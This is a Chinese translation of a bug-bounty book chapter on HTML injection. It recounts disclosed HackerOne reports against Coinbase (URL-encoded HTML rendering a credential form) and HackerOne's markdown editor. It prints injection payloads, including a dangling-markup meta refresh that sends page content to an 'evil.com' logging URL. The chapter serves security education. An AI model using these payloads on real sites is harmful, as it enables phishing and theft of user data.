## **五、HTML 注入**

>作者：Peter Yaworski
>
>譯者：飛龍
>
>協議：CC BY-NC-SA 4.0


## **描述**
超文本標記語言（HTML）注入有時也被稱為虛擬污染。這實際上是一個由站點造成的攻擊，該站點允許惡意用戶向其 Web 頁面注入 
<br>
HTML，並且沒有合理處理用戶輸入。換句話說，HTML 注入漏洞是由接收 HTML 
<br>
引起的，通常通過一些之後會呈現在頁面的表單輸入。這個漏洞是獨立的，不同於注入 Javascript，VBscript 等。
<p>
由於 HTML 是用於定義網頁結構的語言，如果攻擊者可以注入 HTML，它們基本上可以改變瀏覽器呈現的內容。有時，這可能會導致頁面外觀的完全改變，
<br>

或在其他情況下，創建表單來欺騙用戶，例如，如果你可以注入HTML，你也許能夠將`<form> `
<br>
標籤添加到頁面，要求用戶重新輸入他們的用戶名和密碼。然而，當提交此表單時，它實際上將信息發送給攻擊者。

---


### 1. Coinbase 評論
```
難度：低
URL： coinbase.com/apps
報告鏈接： https://hackerone.com/reports/104543
報告日期：2015.12.10
獎金：$200
```
描述：
對於此漏洞，報告者識別出 Coinbase 在呈現文本時，實際上在解碼 URI 的編碼值。對於那
<br>
些不熟悉它的人（我在寫這篇文章的時候），URI 中的字符是保留的或未保留的。根據維基
<br>
百科，保留字是有時有特殊意義的字符，如 `/` 和 `&` 。未保留的字符是沒有任何特殊意義的
<br>
字符，通常只是字母。

因此，當字符被 URI 編碼時，它將按照 ASCII 轉換為其字節值，並以百分號（`%`）開頭。所以，`/`變成`%2F`，`&`成為`%26`。另外，ASCII 
<br>
是一種在互聯網上最常見的編碼，直到 UTF-8 出現，它是另一種編碼類型。現在，回到我們的例子，如果攻擊者輸入 HTML：

```html
<h1> This is a test</h1>
```

Coinbase 實際上會將其渲染為純文本，就像你上面看到的那樣。但是，如果用戶提交了 URL 編碼字符，像這樣：

```
%3C%68%31%3E%54%68%69%73%20%69%73%20%61%20%74%65%73%74%3C%2F%68%31%3E
```
Coinbase 實際上會解碼該字符串，並渲染相應的字符，像這樣：

```
This is a test
```

使用它，報告者演示瞭如何提交帶有用戶名和密碼字段的 HTML 表單，Coinbase 會渲染他。如果這個用戶是惡意的，Coinbase 就會渲染一個表單，它將值提交給惡意網站來捕獲憑據（假設人們填充並提交了表單）。


>重要結論
>
>當你測試一個站點時，要檢查它如何處理不同類型的輸入，包括純文本和編碼文本。特別要注意一些接受 URI 編碼值，例如`%2f`>，並渲染其解碼值的站點，這裡是`/`。雖然我們不知道這個例子中，黑客在想什麼，它們可能嘗試了 URI 編碼限製字符，並註意到 Coinbase >會解碼它們。之後他們更一步 URL 編碼了所有字符。

[http://quick-encoder.com/url](http://quick-encoder.com/url) 是一個不錯的 URL 編碼器。你在使用時會注意到，它告訴你非限製字符不需要編碼，並且提供了編碼 URL 安全字符的選項。這就是獲取用於 COinbase 的相同編碼字符串的方式

---

### 2. HackerOne 無意識 HTML 包含
```
難度：中
URL：hackerone.com
報告鏈接：https://hackerone.com/reports/112935
報告日期：2016.1.26
獎金：$500
描述：
```

在讀完 Yahoo XSS 的描述（第七章示例四），我對文本編輯器中的 HTML 渲染測試產生了興
<br>
趣。這包含玩轉 HackerOne 的 Markdown 編輯器，在圖像標籤中輸入一些類似 ismap=
<br>
"yyy=xxx" 和 "'test" 的東西。這樣做的時候，我注意到，編輯器會在雙引號裡麵包含一個單
<br>
引號 - 這叫做懸置引號。
<p>
那個時候，我並沒有真正理解它的含義。我知道如果你在某個地方注入另一個單引號，兩個
<br>
引號就會被瀏覽器一起解析，瀏覽器會將它們之間的內容視為一個 HTML 元素，例如：
<br>

```html
<h1>This is a test</h1><p class="some class">some content</p>'
```
使用這個例子，如果你打算注入一個 Meta 標籤：
```html
<meta http-equiv="refresh" content='0; url=https://evil.com/log.php?text=
```
瀏覽器會提交兩個引號之間的任何東西。<br />
現在，結果是，這個已經在 HackerOne 的 [https://hackerone.com/reports/110578](#110578)報告中由 [https://hackerone.com/intidc](intidc) 公開。<p>

看到它公開之後，我有一點失望。<br />
根據 HackerOne，它們依賴於 Redcarpet（一個用於 Markdown 處理的 Ruby 庫）的實現，<br />
來轉義任何 Markdown 輸入的 HTML 輸出，隨後它會通過 React 組件<br />
的 dangerouslySetInnerHTML 直接傳遞給 HTML DOM（也就是頁面）。此外，React 是一個<br />
JavaScript 庫，可用於動態更新 Web 頁面的內容，而不需要重新加載頁面。<p>
DOM 指代用於有效 HTML 以及 格式良好的 XML 的應用程序接口。<br />
本質上，根據維基百科，DOM 是跨平台並且語言無關的約定，用於展示 HTML、XHTML 和 XMl 中的對象，並與其交互。<p>
在 HackerOne 的實現中，它們並沒有合理轉義 HTML 輸出，這會導致潛在的漏洞。<br />
現在，也就是說，查看披露，我覺得我應該測試一下心得代碼。我返回並測試了這個：
```html
[test](http://www.torontowebsitedeveloper.com "test ismap="alert xss" yyy="test"\ ")
```
它會變成
```html
<a title="'test" ismap="alert xss" yyy="test" ' ref="http://www.toronotwebsi\ tede
veloper.com">test</a>
```
你可以看到，我能夠將一堆 HTML 注入到 `<a>` 標籤中。<br />
所以，HackerOne 回滾了該修復版本，並重新開始轉義單引號了。
```
重要結論
僅僅是代碼被更新了，並不意味著一些東西修復了，而是還要測試一下。當部署了變更
之後，同時意味著新的代碼也可能存在漏洞。
此外，如果你覺得有什麼不對，一定要深入挖掘。我知道一開始的尾後引號可能是個問
題，但是我不知道如何利用它，所以我停止了。我本應該繼續的。我實際上通過閱讀
XSS Jigsaw 的 了解了 Meta 刷新利用。
```